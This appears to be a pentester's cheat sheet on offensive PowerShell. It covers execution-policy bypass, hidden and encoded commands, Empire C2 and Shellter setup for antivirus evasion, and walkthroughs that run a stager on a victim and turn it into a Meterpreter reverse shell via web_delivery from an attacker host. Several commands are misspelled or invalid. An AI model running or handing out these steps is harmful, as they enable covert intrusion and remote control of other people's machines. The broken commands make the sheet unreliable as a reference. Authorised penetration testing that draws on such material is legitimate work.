# PowerShell for Pentesters

##### Basics

```powershell
# bypass policy
powershell.exe -<ExecutionPolicy | ep> <Bypass | Unrestructer> <program.exe | calc.exe>

# hidden
powershell.exe -WindowStyle Hidden <program.exe | calc.exe>

# encode
powershell.exe -endocdedCommand <$var | string>


powershell.exe -Get-Service # to get sys infos and service running

## get alias ( tous les raccourcis : ls, dir....)
Get-Alias -Definition Get-ChildItem
## get process exe ( path)
Get-Process <ProcessName> | Sort-Object -Unique | Format-List Path

## get infos
Get-WmiObject -class win32_operationsystem | select -Property * | <apply other filter like:  Select-Object <property> >
# alternative to format-list :
fl


# modules ( extension .psm1)

# get all modules
Get-Module -List-Available

#import module
# powersploit
```

## Powershell with C2 and Obfuscation

- In order to evade antivirus, we could combine empire/startkiller stager with other framework like :
  - **Shellter and luckyStrike** to obfuscate or compromise native app

```bash
# install empire in kali
sudo apt install powershell-empire

# install anywhere
sudo apt-get update && sudo apt-get install powershell-empire startkiller -y

# lunch empire
sudo powershell-empire server
# then lunch the client
sudo powershell-empire client
# lunch web interface
startkiller # (in search bar)
# or
startkiller -no-sandbox # in terminal

# go explore empire and startkiller

# Shellter in kali: need wine because is exe
dpkg --add-architecture i386
apt update && apt install wine32
# install shellter
sudo apt install shellter
# download the shellter project and run
wine shellter
# or
shellter
```

### Empire process to get shell for noob :

- Lunch empire server
- Lunch empire client
- create listenner
- create stager
- run stager on victim
- get shell
- interact with agent
- run post exploit modules with : **usemodule**

```bash
# nmap by pivoting
usemodule powershell/situational_awareness/network/portscan
# set host and port
```

### From empire session to meterpreter :

```bash
# interact with the agent
interact agentName
# migrate
usemodule powershell/code_execution/invoke_shellcode
set LHOST <lhost>
set LPORT <lport>
set payload <payloadname | reverse_http>

# go on msfconsole
use exploit/multi/handler
set payload windows/meterpreter/<payload_name>
set LHOST <lhost>
set LPORT <lport>
set exitonsession false
exploit -j
# return on empire agent
execute


#alternative


# 1. go on msfconsole
use exploit/multi/script/web_delivery
set target 2
set SRVHOST <AttackIp>
set LHOST <AttackIp>
set payload windows/meterpreter/<payload_name>
exploit

# 2. go on empire
usemodule powershell/code_execution/invoke_metasploitpayload
set URL <Url From the exploit result>
execute

#3. Got shell
sessions
```
